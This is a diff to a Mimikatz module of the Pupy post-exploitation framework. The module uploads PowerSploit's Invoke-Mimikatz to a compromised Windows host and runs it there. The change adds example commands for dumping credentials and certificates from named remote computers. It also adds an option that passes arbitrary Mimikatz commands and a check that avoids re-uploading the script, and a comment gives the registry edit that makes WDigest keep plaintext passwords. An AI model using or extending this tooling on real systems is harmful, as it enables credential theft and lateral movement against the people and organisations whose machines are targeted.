@@ -15,16 +15,30 @@ class Mimikatz_Powershell(PupyModule):
     """
     
     def init_argparse(self):
-        self.arg_parser = PupyArgumentParser(prog="Mimikatz_Powershell", description=self.__doc__)
+
+        commands_available = '''
+Commandes available:\n
+Invoke-Mimikatz -DumpCerts
+Invoke-Mimikatz -DumpCreds -ComputerName @("computer1", "computer2")
+Invoke-Mimikatz -Command "privilege::debug exit" -ComputerName "computer1"
+'''
+        self.arg_parser = PupyArgumentParser(prog="Mimikatz_Powershell", description=self.__doc__, epilog=commands_available)
+        self.arg_parser.add_argument("-o", metavar='COMMAND', dest='command', default='Invoke-Mimikatz', help='command not needed')
 
     def run(self, args):
         
         # check if windows 8.1 or Win2012 => reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1
 
-        content = open(os.path.join(ROOT, "external", "PowerSploit", "Exfiltration", "Invoke-Mimikatz.ps1"), 'r').read()
-        function = 'Invoke-Mimikatz'
+        script ='mimikatz'
 
-        output = execute_powershell_script(self, content, function, x64IfPossible=True)
+        # check if file has been already uploaded to the target
+        for arch in ['x64', 'x86']:
+            if script not in self.client.powershell[arch]['scripts_loaded']:
+                content = open(os.path.join(ROOT, "external", "PowerSploit", "Exfiltration", "Invoke-Mimikatz.ps1"), 'r').read()
+            else:
+                content = ''
+
+        output = execute_powershell_script(self, content, args.command, x64IfPossible=True, script_name=script)
         if not output:
             self.error("Error running mimikatz. Enough privilege ?")
             return
